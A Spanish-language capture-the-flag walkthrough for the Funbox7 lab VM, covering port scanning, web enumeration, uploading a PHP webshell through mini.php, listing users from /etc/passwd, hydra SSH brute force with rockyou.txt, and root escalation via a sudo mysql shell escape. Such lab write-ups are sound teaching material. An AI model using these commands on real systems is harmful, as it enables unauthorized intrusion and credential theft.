---
title: "🖥️ Máquina: Funbox7 — Hacking Ético"
aliases:
  - Funbox7
  - Máquina Funbox7
  - VM Funbox7
  - Writeup Funbox7
tags:
  - ifct0109
  - hacking-etico
  - vms
  - linux
  - ctf
---

# 🖥️ Máquina: Funbox7

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Dificultad:** Conceptos Básicos  
> **Descripción:** En este reto descubriremos un archivo PHP oculto en la web, subiremos un webshell, enumeraremos usuarios del sistema, realizaremos fuerza bruta en SSH y escalaremos privilegios abusando de mysql como root.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.7`
* **`RHOST` (Víctima / Funbox7):** Ej. `10.0.0.23`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Funbox7 tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Escaneo de puertos

```bash
nmap -sT -p- 10.0.0.23
```

> [!info] Resultado
> Detectamos dos servicios abiertos: SSH (22) y HTTP (80).

Escaneo con más detalle de los servicios:

```bash
nmap -A -p22,80 10.0.0.23
```

---

## 🌐 Fase 2: Enumeración web

Buscamos directorios y ficheros ocultos en el servidor web:

```bash
gobuster dir -u http://10.0.0.23/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

> [!info] Resultado
> Aparece un archivo interesante: mini.php.

---

## ⚡ Fase 3: Webshell

1) Genera una reverse shell en PHP (puedes usar revshells.com para generarla).

2) Sube el fichero al servidor a través de la funcionalidad que te da mini.php.

3) Ajusta permisos para que sea ejecutable desde el navegador:

```bash
chmod 0777 shell_cmd.php
```

4) Accede desde el navegador para abrir la shell:

```bash
http://10.0.0.23/shell_cmd.php
```

---

## 📋 Fase 4: Enumeración local

En la reverse shell, lista los usuarios del sistema que tienen shell interactiva:

```bash
cat /etc/passwd | grep -v -e "nologin" -e "false" -e "sync"
```

> [!info] Resultado
> Aparecen varios usuarios humanos. Recógelos para hacer un diccionario.

---

## 🔐 Fase 5: Fuerza bruta SSH

Crea un diccionario con los usuarios y prueba credenciales con rockyou.txt:

```bash
hydra -L users_funbox7.txt -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.23
```

> [!info] Resultado
> Uno de los usuarios debería devolver credenciales válidas. Conéctate vía SSH:

```bash
ssh <usuario>@10.0.0.23
```

---

## 🚀 Fase 6: Escalada de privilegios

Comprueba los permisos de sudo:

```bash
sudo -l
```

> [!info] Resultado
> Verás que puedes ejecutar mysql como root sin contraseña.

Busca en GTFOBins cómo abusar de mysql para escalar privilegios. Por ejemplo:

```bash
sudo mysql -e '\! /bin/sh'
```

Una vez seas root, lee el contenido de las banderas:

```bash
cat /root/root.flag
```

```bash
cat /root/script.sh
```

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
